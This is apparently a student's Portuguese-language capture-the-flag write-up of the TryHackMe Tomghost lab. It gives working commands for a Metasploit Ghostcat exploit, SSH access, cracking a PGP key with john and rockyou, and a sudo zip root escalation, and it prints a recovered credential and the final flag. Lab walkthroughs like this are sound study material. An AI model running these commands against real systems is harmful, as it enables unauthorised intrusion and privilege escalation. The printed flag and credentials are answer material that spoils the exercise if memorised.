Primeiro:
nmap -A -T4 <ip> para encontrar as portas

rodamos o gobuster mas não deu muito resultado

aplicamos o metaxploit para conseguir o usuario e a senha que nos ajudou a fazer o ssh

uma parte que nos ajudou foi encontrar o problema real do tomcat que foi registrado, falaram que era um problema envolvendo a porta 8009 (encontrada no nmap), jserv e web.xml, todos presentes no alvo que estamos atacando.

usamos metasploit pois a descrição do tomghost diz "Identify (...) to try **exploit** (...)"
Sendo iniciantes e tendo ouvido falar do metasploit nos encontros, deduzimos que era sobre isso que a descrição estava falando...

Após iniciar o metasploit com msfconsole:
search jserv (coincidentemente, apareceu justamente o problema envolvendo o tomcat - ghostcat)
use 0 (índice do problema)
set RHOSTS <ip> (ip do alvo remoto)
set LHOST tun0 (nossa máquina que está atacando)
show options (nos mostrou justamente os itens envolvidos com a vulnerabilidade ghostcat)
run (efetivou o ataque)

o que foi retornado:
![[Pasted image 20251203093448.png]]

depois disso, demos:
ssh skyfuck@<ip>
aí digitamos a senha encontrada (depois dos : na imagem acima)

aí damos um scp para mandar o arquivo .asc do skyfuck pra nossa máquina
scp skyfuck@10.65.151.48:/home/skyfuck/tryhackme.asc /home/henrique

usaremos para aplicar o john:
gpg2john arquivo.asc > arquivo.txt
isso gera um .txt legivel que usaremos com uma wordlist para quebrar a hash que encotramos no .txt:
john rockyou.txt arquivo.txt
isso gera a senha alexandru
Agora:
gpg --decrypt credential.pgp (outro arquivo que estava em skyfuck)
    Usando a senha alexandru
    O que traz até merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
su merlin, para fazer login no merlin, que tem permissão para usar o sudo

Estamo logado no usuário Merlin (que tem permissão para rodar sudo) e rodamos sudo -l 
O que nos leva a 
User merlin may run the following commands on ubuntu: (root : root) NOPASSWD: /usr/bin/zip

Logo, basta procurar como fazer escalação de privilégio com o zip no GTFOBins. Rodamos então o comando: 
sudo zip /tmp/test.zip /etc/hosts -T -TT 'sh #' 

Depois disso, basta entrar na pasta root e abrir o arquivo root.txt, que tem como conteúdo 

THM{Z1P_1S_FAKE} 

Que é a última chave.